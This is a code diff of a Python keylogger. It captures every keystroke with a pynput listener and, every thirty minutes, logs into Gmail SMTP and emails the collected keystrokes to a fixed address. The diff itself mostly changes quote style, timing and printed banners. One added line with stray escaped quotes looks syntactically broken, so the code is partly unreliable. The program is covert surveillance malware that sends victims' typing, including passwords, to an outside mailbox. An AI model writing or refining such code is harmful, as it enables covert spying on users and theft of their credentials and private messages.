@@ -10,43 +10,40 @@ def func1():
     message = []
 
     session_exit = False
-    tm = datetime.datetime.now().time()
-    time_now = datetime.datetime(100,1,1,tm.hour, tm.minute, tm.second).time()
-    email_time = (date_now + datetime.timedelta(0,1800)).time()
+    email_time = datetime.datetime(1,1,1).now().time()
     email_no = 0
-    print("Setup Done")
+    print('Setup Done')
 
     while session_exit == False:
-        tm = datetime.datetime.now().time()
-        date_now = datetime.datetime(100,1,1,tm.hour, tm.minute, tm.second)
-        time_now = date_now.time()
+        time_now = datetime.datetime(1,1,1).now().time()
         if time_now >= email_time:
             email_no += 1
-            print('Email No {}'.format(email_no))
             server = smtplib.SMTP('smtp.gmail.com', 587)
             server.starttls()
             server.login(email, password)
-            string = "".join(message)
-            sending = string.replace("'", "")
+            string = ''.join(message)
+            sending = string.replace(\"'\", '')
             server.sendmail(email, send_to_email , sending)
             server.quit()
-            print(sending)
+            print('\n--------------------------EMAIL SENT----------------------------')
+            print('Email No: {}'.format(email_no))
+            print('Message: {}'.format(sending))
+            print('--------------------------EMAIL SENT----------------------------\n')
             message = []
-
-            email_time = (date_now + datetime.timedelta(0,30)).time()
+            email_time = (datetime.datetime(1,1,1).now() + datetime.timedelta(0,1800)).time()
 
 def func2():
     def on_press(key):
-        if str(key) == "Key.space":
-            key = " "
-        elif str(key) == "Key.backspace":
-            print("Backspace")
+        if str(key) == 'Key.space':
+            key = ' '
+        elif str(key) == 'Key.backspace':
+            print('Backspace')
             if len(message) > 0:
                 del message[-1]
-            key = ""
-        if key != "":
+            key = ''
+        if key != '':
             message.append(str(key))
-        print("Keydown: {}".format(key))
+        print('Keydown: {}'.format(key))
     with Listener(on_press=on_press) as listener:
         listener.join()
 
